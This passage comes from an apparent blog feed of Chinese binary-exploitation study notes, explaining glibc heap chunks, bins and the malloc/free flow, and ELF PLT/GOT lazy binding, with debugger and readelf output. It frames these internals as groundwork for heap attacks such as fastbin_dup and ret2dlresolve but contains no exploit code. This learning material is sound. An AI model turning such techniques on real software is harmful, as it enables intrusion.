            "content_html": "<h1 id=\"glibc的堆管理实现\"><a href=\"#glibc的堆管理实现\" class=\"headerlink\" title=\"glibc的堆管理实现\"></a>glibc的堆管理实现</h1><p>arena</p>\n<p>​\t指的是堆内存区域本身,并非结构\t</p>\n<p>​\t主线程的main arena通过sbrk创建</p>\n<p>​\t其他线程arena通过mmap创建</p>\n<p>malloc_state</p>\n<p>​\t管理arena的核心结构,包括堆的状态信息,bins链表等</p>\n<p>​\tmain arena对应的malloc_state结构存储在glibc的全局变量中</p>\n<p>​\t其他线程的arena对应的malloc_state存储在arena本身</p>\n<p>bins</p>\n<p>​\t用来管理空闲内存块,通常使用链表结构来进行组织</p>\n<p>chunks</p>\n<p>​\t内存块的结构</p>\n<h2 id=\"chunks\"><a href=\"#chunks\" class=\"headerlink\" title=\"chunks\"></a>chunks</h2><p>​\t\t用户请求的空间. </p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230531123349377.png\" alt=\"image-20230531123349377\"></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230228135503733.png\" alt=\"image-20230228135503733\" style=\"zoom:25%;\">\n\n<p>prev_size &#x2F; prev_data： </p>\n<p>• 如果前一个chunk是allocated chunk(P&#x3D;1)，则此字段属于前一个chunk可用的data部分</p>\n<p>• 如果前一个chunk是free chunk(P&#x3D;0)，则此字段表示前一个chunk的size(prev_size)</p>\n<p>标志位（size字段的低3bit） </p>\n<p>• N：NON_MAIN_ARENA flag，表示chunk是否属于主线程</p>\n<p>• M：IS_MMAPPED flag，表示是否由mmap分配</p>\n<p>• P：PREV_INUSE flag，前一个chunk是否处于使用状态</p>\n<p>如果当前chunk已经被free到bin中，</p>\n<p>• fd：指向bin中后一个空闲块的指针</p>\n<p>• bk：指向bin中前一个空闲块的指针</p>\n<p>（后一个和前一个均不一定是物理相邻的）</p>\n<p>如果当前chunk已经被free到large bin（后面马上会提到）中，</p>\n<p>• fd_nextsize：指向large bin中后一个与自己大小不同的chunk的指针</p>\n<p>• bk_nextsize：指向large bin中前一个与自己大小不同的chunk的指针</p>\n<p>大小对齐</p>\n<p>在glibc中，对齐由malloc.c中的request2size宏实现。可以简单将该操作理解为下表中的映射，即：实际size &#x3D; 请求的size+8后对应的下一个0x10对齐的值</p>\n<p>这里应该还考虑了下一个chunk的复用,那万一复用不了呢?</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230531125219099.png\" alt=\"image-20230531125219099\" style=\"zoom:25%;\">\n\n<h3 id=\"free-chunk\"><a href=\"#free-chunk\" class=\"headerlink\" title=\"free chunk\"></a>free chunk</h3><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230306130932182.png\" alt=\"image-20230306130932182\" style=\"zoom: 33%;\">\n\n<h3 id=\"allocated-chunk\"><a href=\"#allocated-chunk\" class=\"headerlink\" title=\"allocated chunk\"></a>allocated chunk</h3><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230306130712884.png\" alt=\"image-20230306130712884\" style=\"zoom:33%;\">\n\n<p>下一个chunk的prev_size也可以被用来存放数据,因为只有前一个chunk是free的时候这个字段才有意义</p>\n<h1 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h1><p>顺便学一下怎么调试源码</p>\n<p>指定libc版本编译 <a href=\"https://blog.csdn.net/mo4776/article/details/119837501\">https://blog.csdn.net/mo4776/article/details/119837501</a></p>\n<p>-Wl,–dynamic-linker&#x3D;&#x2F;动态连接器的路径&#x2F;ld-linux-x86-64.so.2</p>\n<p><a href=\"https://blog.csdn.net/bandaoyu/article/details/121476940\">https://blog.csdn.net/bandaoyu/article/details/121476940</a></p>\n<p>gcc -Wl,-rpath&#x3D;’&#x2F;my&#x2F;lib’,-dynamic-linker&#x3D;’&#x2F;my&#x2F;lib&#x2F;ld-linux.so.2’</p>\n<p>gcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c</p>\n<h1 id=\"各种bin\"><a href=\"#各种bin\" class=\"headerlink\" title=\"各种bin\"></a>各种bin</h1><p>​\tfast bin、tcache bin按照LIFO(last in first out)单链表组织，采用头插法</p>\n<p>​\tunsorted bin、small bin按照FIFO(first in first out)双链表组织，采用头插法</p>\n<p>​\tlarge bin按照双链表组织，插入节点时会保证size从大到小排序</p>\n<p><a href=\"https://blog.51cto.com/u_15076233/3914352\">https://blog.51cto.com/u_15076233/3914352</a></p>\n<p>​\t\t有两种结构来管理,一种是fastbin的,另外一种是其他三种bin的</p>\n<h3 id=\"x2F-Fastbins-x2F-用来管理小的chunk\"><a href=\"#x2F-Fastbins-x2F-用来管理小的chunk\" class=\"headerlink\" title=\"&#x2F;* Fastbins *&#x2F; 用来管理小的chunk\"></a>&#x2F;* Fastbins *&#x2F; 用来管理小的chunk</h3><p>​\t\tmfastbinptr fastbinsY[NFASTBINS];</p>\n<h3 id=\"x2F-Normal-bins-packed-as-described-above-x2F\"><a href=\"#x2F-Normal-bins-packed-as-described-above-x2F\" class=\"headerlink\" title=\"&#x2F;* Normal bins packed as described above *&#x2F;\"></a>&#x2F;* Normal bins packed as described above *&#x2F;</h3><p>​\t\tmchunkptr bins[NBINS * 2 - 2];</p>\n<p>​\t\t• bins：能够存放所有size范围的free chunk，共127个链表节点项，每个链表长度不限。</p>\n<p>​\t\t• bin[0]为unsorted bin  存放未整理的chunk</p>\n<p>​\t\t• bin[2] ~ bin[63]为small bin 管理中等大小的chunk</p>\n<p>​\t\t• bin[64] ~ bin[127]为large bin  存放较大的chunk</p>\n<h2 id=\"fastbin\"><a href=\"#fastbin\" class=\"headerlink\" title=\"fastbin\"></a>fastbin</h2><p>​\t\t将小chunk单独管理(0x20 - 0x80,以0x10为单位,共7个),fd指向它前面那一个 (64位)</p>\n<p>​\t\t使用顺序: <font color=\"red\">先进后出 ,或者说,后进,先出, 头插! </font></p>\n<p>​\t\t靠近fastbinY[]的是头部</p>\n<p>​\t\t释放的时候并不会把p标志置为0</p>\n<p>​\t\t</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230228135750332.png\" alt=\"image-20230228135750332\"></p>\n<p><a href=\"https://kiprey.github.io/2020/04/heap-3-bins/\">https://kiprey.github.io/2020/04/heap-3-bins/</a></p>\n<p>堆命令: vis fastbin</p>\n<p>how2heap 2.23 fastbin的例子<a href=\"https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c\">https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c</a></p>\n<p>分配完三个0x8大小的堆块后的堆布局,这里有几个细节需要注意.</p>\n<p>1.对齐问题,因为要进行16字节对齐,所以哪怕是分配了8字节,也会给一个16字节的空间,头部是16字节,所以一共32字节</p>\n<p>Malloc(16)也是这样的,malloc(24呢) 也是一样的, 是因为会复用下一个chunk的prev_size吗? 那不复用不就不够了</p>\n<p>这个size是包含了头部的</p>\n<p>那岂不是如果malloc24的话,正好的空间,malloc16的话,会多了8字节可用的空间</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405104919306.png\" alt=\"image-20230405104919306\"></p>\n<p>后进先出,后面进来的会被挂到头部,可以修改一下代码,释放abc看一下,c是0,b是1,a是2</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405182425846.png\" alt=\"image-20230405182425846\"></p>\n<h2 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a>unsorted bin</h2><p>​\t\t(除了fastbin外) 被释放的chunk以及把大的chunk分割出来的剩下的chunk,都会先放进这里,目的主要是能让malloc有二次利用最近释放的chunk的机会</p>\n<p>​\t\tunsorted bin只有一个,位于bin[1]中 ???? </p>\n<p>​\t\t无序双向链表,FIFO, 链头插入chunk,链尾取出?? 不对吧 对的,看图,左边是插入,右边是取出</p>\n<p>​\t\tunsorted bin 本身是什么呢? 在哪里?</p>\n<p>​\t\t释放的时候会合并? 什么情况下, 相邻的会合并,(还有其他条件吗?)</p>\n<p>unsortedbin<br>all: 0x5555557591c0 —▸ 0x555555759000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557591c0</p>\n<p>unsortedbin<br>all: 0x555555759380 —▸ 0x5555557591c0 —▸ 0x555555759000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555759380</p>\n<p>左右箭头应该是 fd和bk的意思( 左箭头是值的意思吧)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405185946527.png\" alt=\"image-20230405185946527\"></p>\n<h2 id=\"small-bin\"><a href=\"#small-bin\" class=\"headerlink\" title=\"small bin\"></a>small bin</h2><p>​\t\tbin[2] ~ bin[63]为small bin, 管理大小为[0x20, 0x400]的 free chunk,(64位)</p>\n<p>​\t\tsmall bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size &#x3D; 2 * SIZE_SZ *index，具体如下</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405191536275.png\" alt=\"image-20230405191536275\" style=\"zoom:50%;\">\n\n<p>​\t\t16-504B 0x10-0x200</p>\n<p>​\t\t32-1008B 0x20-0x400</p>\n<p>​\t\t索引为<code>2</code>中chunk大小为0x20 - 0x30<br>​\t\t索引为<code>3</code>里的chunk大小为0x30 - 0x40<br>​\t\t<code>......</code><br>​\t\t索引为<code>63</code>里的chunk大小为0x3F0 - <font color=\"red\">0x400</font></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230416162024923.png\" alt=\"image-20230416162024923\"></p>\n<h2 id=\"large-bin\"><a href=\"#large-bin\" class=\"headerlink\" title=\"large bin\"></a>large bin</h2><p>​\t\tbin[64] ~ bin[126]为large bin  存放较大的chunk</p>\n<p>​\t\tlarge bin 大体上分为6大组，其中每个大组里都有若干小组</p>\n<p>​\t\tlarge bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405192532890.png\" alt=\"image-20230405192532890\" style=\"zoom:50%;\">\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230401215539966.png\" alt=\"image-20230401215539966\"></p>\n<h2 id=\"tcachebin\"><a href=\"#tcachebin\" class=\"headerlink\" title=\"tcachebin\"></a>tcachebin</h2><p>2.26开始</p>\n<h1 id=\"malloc和free流程\"><a href=\"#malloc和free流程\" class=\"headerlink\" title=\"malloc和free流程\"></a>malloc和free流程</h1><p><a href=\"http://raw.githubusercontent.com/cloudburst/libheap/master/heap.png\">raw.githubusercontent.com&#x2F;cloudburst&#x2F;libheap&#x2F;master&#x2F;heap.png</a></p>\n<h2 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h2><p>malloc的具体实现可以查看malloc.c中_int_malloc函数，大致流程如下：</p>\n<p>1.将大小按规则对齐，得到实际要分配的大小size</p>\n<p>2.检查size是否符合<strong>tcache bin</strong>的大小。如果是，检查对应size的entry是否有free chunk。如果有，则分配返回</p>\n<p>3.检查size是否符合<strong>fast bin</strong>的大小。如果是，检查对应size的entry是否有free chunk。如果有，则分配返回</p>\n<p>4.循环遍历<strong>unsorted bin</strong>，寻找可用的free chunk</p>\n<p>​\t•  如果遍历到的free chunk size正好和所需size相等，则分配返回</p>\n<p>​\t•  如果遍历到的free chunk size和所需size不等，则将其从双链表中解链(unlink)，插入到对应大小的bins中</p>\n<p>5.根据size，以best-fit的方式，找到相应的<strong>small bin</strong>或者<strong>large bin</strong></p>\n<p>​\t• 对于small bin，如果size正好合适，那么unlink之后，直接将该chunk返回给用户；否则进行切割，剩下的部分重新插入到unsorted bin中。</p>\n<p>​\t• 对于large bin，由于一个bin通常对应几个size，那么根据fd_nextsize的顺序，以size从大到小的顺序遍历chunk，同样采取best-fit的方式寻找合适的chunk，后续行为与small bin类似。</p>\n<p>6.使用<strong>top chunk</strong>，将top chunk进行切割：</p>\n<p>• 如果top chunk size足够，则将切割下来的部分返回，剩下的部分继续作为top chunk</p>\n<p>• 如果top chunk size不够，则需要通过sysmalloc申请更多的堆空间</p>\n<h2 id=\"free\"><a href=\"#free\" class=\"headerlink\" title=\"free\"></a>free</h2><p>free的具体实现可以查看malloc.c中_int_free函数，大致流程如下：</p>\n<ol>\n<li>如果free chunk的size属于<strong>tcache</strong>范围内，且对应大小的tcache bin没有满，则插入到相应的</li>\n</ol>\n<p>tcache bin中去</p>\n<ol>\n<li>如果free chunk的size属于<strong>fast bin</strong>范围内，且对应大小的tcache bin满了，则插入到fastbin</li>\n</ol>\n<p>中去</p>\n<ol>\n<li>如果上述条件均不满足，则通过该chunk的prev_inuse标志位检查是否可以前后向合并：</li>\n</ol>\n<p>• 如果可以合并，则将需要被合并的chunk先unlink下来，合并成一个更大的chunk后再插入到</p>\n<p>unsorted bin中（或合并到top chunk里面）</p>\n<p>• 如果不可以合并，则将该chunk直接插入到unsorted bin中</p>\n<ol>\n<li>free chunk是mmap的chunk，那么调用munmap直接返回给系统</li>\n</ol>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p>ctf-wiki</p>\n<p>datacon训练营</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/",
            "title": "pwn入门-12-pltgot延迟绑定及符号解析",
            "date_published": "2023-02-28T10:22:14.000Z",
            "content_html": "<p>​\t\t2023.7.8更新:很早之前已经写了这篇博客,但是只学了一点皮毛..只在表面,后面学到了ret2dlresolve漏洞发现需要理解这部分东西,又回炉重造,添加了需要学习的更细致的知识</p>\n<h1 id=\"符号解析\"><a href=\"#符号解析\" class=\"headerlink\" title=\"符号解析\"></a>符号解析</h1><h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><p>参考ctfwiki(wiki中是倒推的,感觉理解起来不如正推)</p>\n<p>​\t\t在 ELF 文件中，对于每一个需要重定位的 ELF 节都有对应的重定位表，比如说 .text 节如果需要重定位，那么其对应的重定位表为 .rel.text。 所以.rel.plt就是plt节需要重定位所产生的节了.</p>\n<p>​\t\t.rel.plt中就会包含一个指向这个符号的重定位表项. r_offset给出了要修改的位置,r_info给出了要修改的符号的符号表索引,所以r_info索引到了 .dynsym</p>\n<p>​\t\t.dynsym中,st_name保存着动态符号在dynstr中的偏移</p>\n<p>​\t\t.dynstr又是怎么来的呢? 答:当一个程序导入某个函数时,.dynstr就会包含对应函数名称的字符串(<strong>最后是根据这个字符串名字来进行解析的!!!</strong>)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708162249130.png\" alt=\"image-20230708162249130\"></p>\n<p>以       ret2dl中的例子来说,可以用readelf查看这些节(但在ida中不会显示的这么全,会放到LOAD段里)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/ret2dl# readelf -S main_partial_relro_32</span><br><span class=\"line\">There are 31 section headers, starting at offset 0x3848:</span><br><span class=\"line\"></span><br><span class=\"line\">Section Headers:</span><br><span class=\"line\">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class=\"line\">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class=\"line\">  [ 1] .interp           PROGBITS        080481b4 0001b4 000013 00   A  0   0  1</span><br><span class=\"line\">  [ 2] .note.gnu.build-i NOTE            080481c8 0001c8 000024 00   A  0   0  4</span><br><span class=\"line\">  [ 3] .note.gnu.propert NOTE            080481ec 0001ec 00001c 00   A  0   0  4</span><br><span class=\"line\">  [ 4] .note.ABI-tag     NOTE            08048208 000208 000020 00   A  0   0  4</span><br><span class=\"line\">  [ 5] .gnu.hash         GNU_HASH        08048228 000228 000020 04   A  6   0  4</span><br><span class=\"line\">  [ 6] .dynsym           DYNSYM          08048248 000248 0000a0 10   A  7   1  4</span><br><span class=\"line\">  [ 7] .dynstr           STRTAB          080482e8 0002e8 00006b 00   A  0   0  1</span><br><span class=\"line\">  [ 8] .gnu.version      VERSYM          08048354 000354 000014 02   A  6   0  2</span><br><span class=\"line\">  [ 9] .gnu.version_r    VERNEED         08048368 000368 000020 00   A  7   1  4</span><br><span class=\"line\">  [10] .rel.dyn          REL             08048388 000388 000018 08   A  6   0  4</span><br><span class=\"line\">  [11] .rel.plt          REL             080483a0 0003a0 000028 08  AI  6  24  4</span><br><span class=\"line\">  [12] .init             PROGBITS        08049000 001000 000024 00  AX  0   0  4</span><br><span class=\"line\">  [13] .plt              PROGBITS        08049030 001030 000060 04  AX  0   0 16</span><br><span class=\"line\">  [14] .plt.sec          PROGBITS        08049090 001090 000050 10  AX  0   0 16</span><br><span class=\"line\">  [15] .text             PROGBITS        080490e0 0010e0 000289 00  AX  0   0 16</span><br><span class=\"line\">  [16] .fini             PROGBITS        0804936c 00136c 000018 00  AX  0   0  4</span><br><span class=\"line\">  [17] .rodata           PROGBITS        0804a000 002000 000008 00   A  0   0  4</span><br><span class=\"line\">  [18] .eh_frame_hdr     PROGBITS        0804a008 002008 000054 00   A  0   0  4</span><br><span class=\"line\">  [19] .eh_frame         PROGBITS        0804a05c 00205c 000150 00   A  0   0  4</span><br><span class=\"line\">  [20] .init_array       INIT_ARRAY      0804bf04 002f04 000004 04  WA  0   0  4</span><br><span class=\"line\">  [21] .fini_array       FINI_ARRAY      0804bf08 002f08 000004 04  WA  0   0  4</span><br><span class=\"line\">  [22] .dynamic          DYNAMIC         0804bf0c 002f0c 0000e8 08  WA  7   0  4</span><br><span class=\"line\">  [23] .got              PROGBITS        0804bff4 002ff4 00000c 04  WA  0   0  4</span><br><span class=\"line\">  [24] .got.plt          PROGBITS        0804c000 003000 000020 04  WA  0   0  4</span><br><span class=\"line\">  [25] .data             PROGBITS        0804c020 003020 000008 00  WA  0   0  4</span><br><span class=\"line\">  [26] .bss              NOBITS          0804c028 003028 000004 00  WA  0   0  1</span><br><span class=\"line\">  [27] .comment          PROGBITS        00000000 003028 00002b 01  MS  0   0  1</span><br><span class=\"line\">  [28] .symtab           SYMTAB          00000000 003054 000480 10     29  45  4</span><br><span class=\"line\">  [29] .strtab           STRTAB          00000000 0034d4 000254 00      0   0  1</span><br><span class=\"line\">  [30] .shstrtab         STRTAB          00000000 003728 00011d 00      0   0  1</span><br><span class=\"line\">Key to Flags:</span><br><span class=\"line\">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class=\"line\">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class=\"line\">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class=\"line\">  p (processor specific)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"rel-plt\"><a href=\"#rel-plt\" class=\"headerlink\" title=\".rel.plt\"></a>.rel.plt</h3><p>​\t\t.rel.dyn是动态链接的二进制文件中需要重定位的变量的信息,.rel.plt是需要重定位的函数的信息</p>\n<p>​\t\t它的结构如下(以32位为例),两种类型区别见wiki</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    Elf32_Addr        r_offset;</span><br><span class=\"line\">    Elf32_Word       r_info;</span><br><span class=\"line\">&#125; Elf32_Rel;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    Elf32_Addr     r_offset;</span><br><span class=\"line\">    Elf32_Word    r_info;</span><br><span class=\"line\">    Elf32_Sword    r_addend;</span><br><span class=\"line\">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708162230315.png\" alt=\"image-20230708162230315\"></p>\n<p>​\t\t最重要的就是前两个字段,r_offset,给出了需要重定位的位置,对于可执行文件而言,取值是需要重定位的<b>虚拟地址</b>,一般而言也就是GOT表的地址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708163140389.png\" alt=\"image-20230708163140389\"></p>\n<p>​\t\tGOT表中开始存放的值是这个</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708163342737.png\" alt=\"image-20230708163342737\"></p>\n<p>​\t\t这玩意也就是plt表,要进行真正解析的地方</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708163428111.png\" alt=\"image-20230708163428111\"></p>\n<p>​\t\tr_info给出需要重定位的符号的符号表索引,以及相应的重定位类型. <b>换句话说,第一个参数是告诉你要把哪里的值进行修改,这个参数是告诉你,要修改哪个符号.</b></p>\n<ul>\n<li>高三个字节对应的值表示这个动态符号在.dynsym符号表中的位置</li>\n<li>最低字节表示的是重定位类型</li>\n</ul>\n<h3 id=\"dynsym\"><a href=\"#dynsym\" class=\"headerlink\" title=\".dynsym\"></a>.dynsym</h3><p>​\t\t结构如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  Elf32_Word    st_name;   <span class=\"comment\">/* Symbol name (string tbl index) */</span></span><br><span class=\"line\">  Elf32_Addr    st_value;  <span class=\"comment\">/* Symbol value */</span></span><br><span class=\"line\">  Elf32_Word    st_size;   <span class=\"comment\">/* Symbol size */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">char</span> st_info;   <span class=\"comment\">/* Symbol type and binding */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">char</span> st_other;  <span class=\"comment\">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class=\"line\">  Elf32_Section st_shndx;  <span class=\"comment\">/* Section index */</span></span><br><span class=\"line\">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这个在ida中也是没有直接给出的,可以用readelf查看然后寻找.</p>\n<p>​\t\t其中比较重要的字段</p>\n<ul>\n<li>st_name 保存着动态符号在.dynstr表(动态字符串表)中的偏移</li>\n<li>st_value 如果这个符号被导出,这个符号保存着对应的虚拟地址</li>\n</ul>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708164800762.png\" alt=\"image-20230708164800762\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Elf32_Sym &lt;offset aRead - offset unk_80482E8, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">12</span>h, <span class=\"number\">0</span>, <span class=\"number\">0</span>&gt; ; <span class=\"string\">&quot;read&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t以read为例,aRead是这个符号的虚拟地址, 减去符号表开始的虚拟地址,就得到了偏移, read的这个值为0x27</p>\n<p>0x804830F - 0x80482E8 &#x3D; 0x27,也就是read这个字符串开始的地方,(以及他们每个字符串结束后都有个0,位置结束符号)</p>\n<p>​\t\tdynstr表如下</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708165101316.png\" alt=\"image-20230708165101316\"></p>\n<h3 id=\"dynmaic\"><a href=\"#dynmaic\" class=\"headerlink\" title=\".dynmaic\"></a>.dynmaic</h3><p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708172738811.png\" alt=\"image-20230708172738811\"></p>\n<h2 id=\"解析过程\"><a href=\"#解析过程\" class=\"headerlink\" title=\"解析过程\"></a>解析过程</h2><h1 id=\"got-plt-got-plt-延迟绑定\"><a href=\"#got-plt-got-plt-延迟绑定\" class=\"headerlink\" title=\"got plt .got.plt 延迟绑定\"></a>got plt .got.plt 延迟绑定</h1><h2 id=\"got表-got-plt表\"><a href=\"#got表-got-plt表\" class=\"headerlink\" title=\"got表 got.plt表\"></a>got表 got.plt表</h2><p>​\t\tGloble offset table全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址，GOT表存储在数据段，（在IDA中是也就是.data段）可以在程序运行中被修改。</p>\n<p>​\t\t.got 存放全局变量引用</p>\n<p>​\t\t.got.plt 存放需要延迟绑定的函数</p>\n<p>​\t\tgot表的初始状态指向一段plt,首次调用时会由plt表中指令进行解析,得到真正的函数地址(即内存中的地址)并填入相应的got表项</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230228164021947.png\" alt=\"image-20230228164021947\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230303132148041.png\" alt=\"image-20230303132148041\"></p>\n<h2 id=\"plt表\"><a href=\"#plt表\" class=\"headerlink\" title=\"plt表\"></a>plt表</h2><p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230303132136453.png\" alt=\"image-20230303132136453\"></p>\n<p><a 